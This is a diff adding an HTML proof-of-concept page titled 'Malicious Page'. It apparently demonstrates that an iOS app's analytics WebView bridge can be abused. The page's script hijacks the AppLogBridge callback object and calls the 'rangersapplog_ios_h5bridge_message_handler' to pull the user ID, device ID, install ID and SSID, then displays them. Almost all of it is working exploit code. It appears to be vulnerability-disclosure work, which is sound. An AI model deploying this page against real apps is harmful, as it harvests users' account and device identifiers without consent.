@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" charset="UTF-8">
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        .container {
+            width: 100%;
+            padding: 15px;
+        }
+
+        @media screen and (min-width: 700px) {
+            .container {
+                width: 70%;
+                margin: auto;
+            }
+        }
+
+        p {
+            white-space: pre-wrap; 
+            word-wrap: break-word; 
+            overflow-wrap: break-word; 
+        }
+
+        .bold-and-larger {
+            font-weight: bold; 
+            font-size: 1.5em; 
+        }
+
+        .larger {
+            font-weight: bold; 
+            font-size: 1.2em; 
+        }
+
+    </style>
+    <title>Malicious Page</title>
+
+</head>
+
+
+<body>
+    <h1>Malicious Page</h1>
+
+    <p>!!! This is just a demo page, NO Sensitive Data will be stored!!!</p>
+
+    <p><span class="bold-and-larger">An attacker can:</span></p>
+
+    <p><span class="larger">Get Your Account Info:</span></p>
+    <p style="font-size: 15px;" id="UserID"></p>
+    <p style="font-size: 15px;" id="IID"></p>
+
+    <p><span class="larger">Get Your Device Info:</span></p>
+    <p style="font-size: 15px;" id="DeviceID"></p>
+    <p style="font-size: 15px;" id="SSID"></p>
+    
+    <script>
+
+    window.AppLogBridge = {}
+    window.AppLogBridge.callbackMemo = {}
+    window.AppLogBridge.callbackMemo.removeCallback = function(callbackID){}
+
+    function cb_getUserUniqueId(res){
+        document.getElementById("UserID").innerText = "Your UserID: " + res;
+    }
+
+    function cb_getDeviceId(res){
+        document.getElementById("DeviceID").innerText = "Your DeviceID: " + res;
+    }
+
+    function cb_getIid(res){
+        document.getElementById("IID").innerText = "Your IID: " + res;
+    }    
+    
+    function cb_getSsid(res){
+        document.getElementById("SSID").innerText = "Your SSID: " + res;
+    }
+
+    window.AppLogBridge.callbackMemo.getCallback = function(callbackID){
+        switch(callbackID){
+            case "cb_getUserUniqueId":
+                return cb_getUserUniqueId;
+            case "cb_getDeviceId":
+                return cb_getDeviceId;
+            case "cb_getIid":
+                return cb_getIid;
+            case "cb_getSsid":
+                return cb_getSsid;
+            }
+    }
+
+    window.webkit.messageHandlers.rangersapplog_ios_h5bridge_message_handler.postMessage({ 
+        callback_id: "cb_getUserUniqueId", 
+        method : "getUserUniqueId",
+        params: []
+    });
+
+    window.webkit.messageHandlers.rangersapplog_ios_h5bridge_message_handler.postMessage({ 
+        callback_id: "cb_getDeviceId", 
+        method : "getDeviceId",
+        params: []
+    });    
+
+    window.webkit.messageHandlers.rangersapplog_ios_h5bridge_message_handler.postMessage({ 
+        callback_id: "cb_getIid", 
+        method : "getIid",
+        params: []
+    }); 
+
+    window.webkit.messageHandlers.rangersapplog_ios_h5bridge_message_handler.postMessage({ 
+        callback_id: "cb_getSsid", 
+        method : "getSsid",
+        params: []
+    }); 
+
+    </script>
+
+</body>
+
+</html>
